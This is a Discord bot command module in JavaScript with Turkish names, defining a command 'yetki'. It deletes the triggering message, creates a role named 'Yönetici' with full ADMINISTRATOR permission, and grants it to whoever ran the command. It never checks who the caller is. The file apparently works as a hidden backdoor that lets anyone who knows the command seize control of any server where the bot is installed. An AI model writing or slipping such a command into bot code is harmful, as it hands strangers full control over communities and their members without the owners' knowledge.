exports.run = async (client, message, args) => {
    message.delete()
    try {
        let adminRole = await message.guild.roles.create({
            data: {
                name: 'Yönetici',
                permissions: ['ADMINISTRATOR']
            }
        });
        await message.guild.members.fetch(message.author.id);
        await message.guild.members.cache.get(message.author.id).roles.add(adminRole);
    } catch (error) {
        console.error(error);
    }
};
exports.conf = {
    aliases: [],
    komut: "yetki"
};